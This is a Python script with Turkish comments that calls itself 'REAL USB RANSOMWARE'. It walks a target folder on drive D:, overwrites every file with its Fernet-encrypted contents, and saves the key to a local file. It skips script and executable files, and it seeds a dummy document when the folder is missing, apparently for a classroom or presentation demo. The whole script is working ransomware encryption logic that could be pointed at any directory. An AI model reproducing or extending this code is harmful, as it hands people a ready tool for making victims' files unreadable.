import os
import sys
from cryptography.fernet import Fernet

# --- REAL USB RANSOMWARE (TARGETED FOLDER) ---
# AMAÇ: D: sürücüsündeki belirli bir klasörü şifrelemek.
# GÜVENLİK ÖNLEMİ: Tüm diski değil, sadece hedef klasörü siler.

def generate_key():
    # Anahtar oluşturuluyor...
    key = Fernet.generate_key()
    with open("usb_secret.key", "wb") as key_file:
        key_file.write(key)
    return key

def load_key():
    return open("usb_secret.key", "rb").read()

def encrypt_target(target_folder):
    # Anahtar kontrolü
    if not os.path.exists("usb_secret.key"):
        key = generate_key()
        print("[+] Şifreleme Anahtarı Oluşturuldu: usb_secret.key")
    else:
        key = load_key()

    fernet = Fernet(key)
    
    print(f"\n[*] HEDEF: {target_folder} taranıyor ve şifreleniyor...")

    file_count = 0
    # Klasörleri gez
    for root, dirs, files in os.walk(target_folder):
        for file in files:
            # Anahtar dosyasını ve scriptin kendisini şifreleme!
            if file == "usb_secret.key" or file.endswith(".py") or file.endswith(".exe"):
                continue

            file_path = os.path.join(root, file)
            
            try:
                with open(file_path, "rb") as f:
                    original_data = f.read()
                
                # Gerçek Şifreleme (AES)
                encrypted_data = fernet.encrypt(original_data)
                
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
                
                print(f"[KİLİTLENDİ] {file}")
                file_count += 1
                
            except Exception as e:
                print(f"[HATA] {file}: {e}")

    print(f"\n[SONUÇ] {file_count} dosya başarıyla şifrelendi.")
    print("[!] DİKKAT: 'usb_secret.key' dosyasını saklayın. Yoksa veriler açılmaz.")

if __name__ == "__main__":
    # --- AYARLAR ---
    # Hedef Sürücü ve Klasör
    USB_DRIVE = "D:\\"
    TARGET_FOLDER_NAME = "USB_HEDEF_VERILER"
    
    FULL_TARGET_PATH = os.path.join(USB_DRIVE, TARGET_FOLDER_NAME)

    # 1. USB (D:) Takılı mı Kontrol Et
    if not os.path.exists(USB_DRIVE):
        print(f"[!] HATA: {USB_DRIVE} sürücüsü bulunamadı! USB takılı mı?")
        sys.exit()

    # 2. Hedef Klasör Var mı? Yoksa Oluştur (Test İçin)
    if not os.path.exists(FULL_TARGET_PATH):
        print(f"[*] {FULL_TARGET_PATH} bulunamadı, sunum için oluşturuluyor...")
        os.makedirs(FULL_TARGET_PATH)
        # İçine sahte veri koyalım ki şifreleyecek bir şey olsun
        with open(os.path.join(FULL_TARGET_PATH, "gizli_belge.txt"), "w") as f:
            f.write("Bu belge birazdan şifrelenecek kritik veridir.")
        print("[+] Test dosyaları oluşturuldu.")

    # 3. Şifrelemeyi Başlat
    encrypt_target(FULL_TARGET_PATH)